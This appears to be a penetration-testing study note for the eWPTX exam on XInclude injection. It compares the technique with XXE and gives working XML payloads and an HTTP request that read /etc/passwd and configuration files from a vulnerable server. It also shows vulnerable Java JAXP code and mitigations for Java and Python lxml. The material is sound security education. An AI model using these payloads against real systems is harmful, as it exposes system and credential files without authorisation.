2026-02-04 17:55

Status:

Tags: [[eWPTX]] [[XML]]
###### Prerequisites: [[XML Injection - Attack Types]]
# XInclude Injection

## Overview

XInclude injection happens when an XML processor supports XInclude and user-controlled input influences what gets included. This is significant because **you do not need to control the DOCTYPE** -- XInclude works even when you cannot define custom entities.

## When XInclude Works vs XXE

| Scenario                                    | XXE  | XInclude |
|---------------------------------------------|------|----------|
| You control the full XML document           | Yes  | Yes      |
| You control only a value inside existing XML | No   | **Yes**  |
| DTD processing is disabled                  | No   | **Yes**  |
| Server uses JSON-to-XML conversion          | No   | **Yes**  |

XInclude is the go-to technique when your input is embedded into a server-side XML document and you cannot inject a `<!DOCTYPE>` declaration.

## Basic Payload

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

The `xmlns:xi` namespace declaration is mandatory. Without it, the processor ignores the `xi:include` element.

## parse="text" vs parse="xml"

**parse="text"** (most useful for attacks):
- Includes the target as plain text
- No XML parsing of the included content
- Works for reading `/etc/passwd`, source code, config files

```xml
<xi:include parse="text" href="file:///etc/passwd"/>
```

**parse="xml"** (default if omitted):
- Included content must be well-formed XML
- Fails on non-XML files (parse error)
- Useful for including other XML config files

```xml
<xi:include parse="xml" href="file:///etc/spring-config.xml"/>
```

## Injection in HTTP Request

The attacker injects into a parameter that gets placed inside XML server-side.

**Request:**
```http
POST /api/check HTTP/1.1
Content-Type: application/x-www-form-urlencoded

productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

The server builds XML like:
```xml
<?xml version="1.0"?>
<stockCheck>
  <productId>
    <foo xmlns:xi="http://www.w3.org/2001/XInclude">
      <xi:include parse="text" href="file:///etc/passwd"/>
    </foo>
  </productId>
</stockCheck>
```

**Response (if vulnerable):**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

## Vulnerable Java JAXP Code

```java
// VULNERABLE: XInclude enabled by default in some configurations
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setNamespaceAware(true);
dbf.setXIncludeAware(true);  // explicitly enables XInclude
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(new InputSource(new StringReader(userInput)));
```

## Mitigation

**Java JAXP:**
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setXIncludeAware(false);
dbf.setFeature("http://apache.org/xml/features/xinclude", false);
```

**Python lxml:**
```python
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)
# lxml does not support XInclude by default unless you call xinclude()
# Do NOT call tree.xinclude() on untrusted input
```

**General rules:**
- Disable XInclude processing unless explicitly needed
- If XInclude is required, whitelist allowed `href` schemes and paths
- Validate that user input cannot inject XML namespace declarations
